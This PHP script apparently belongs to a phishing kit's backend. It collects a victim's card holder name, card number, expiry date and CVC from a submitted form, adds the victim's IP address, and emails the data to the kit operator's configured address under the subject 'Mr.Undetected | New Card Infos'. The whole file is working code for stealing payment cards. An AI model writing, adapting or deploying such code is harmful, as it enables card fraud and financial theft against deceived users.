<?php
session_start();
require_once('../inc/config.inc.php');
require_once("../inc/function.inc.php");

$firstnamecard = $_POST['firstnamecard'];
$lastnamecard = $_POST['lastnamecard'];
$cardnumber = $_POST['cardnumber'];
$expdate = $_POST['expdate'];
$scv = $_POST['scv'];
$_SESSION['Card Holder'] = $lastnamecard." ".$firstnamecard;
$_SESSION['Card Number'] = $cardnumber;
$_SESSION['EXP Date'] = $expdate;
$_SESSION['CVC'] = $scv;
$ip=$_SESSION['ip']=getip();
$subject = $_SESSION['subject'] = "Mr.Undetected | New Card Infos [$ip] ***" ;
$to = $setting["mail_to"];


send($_SESSION,$to,$subject); 
?>
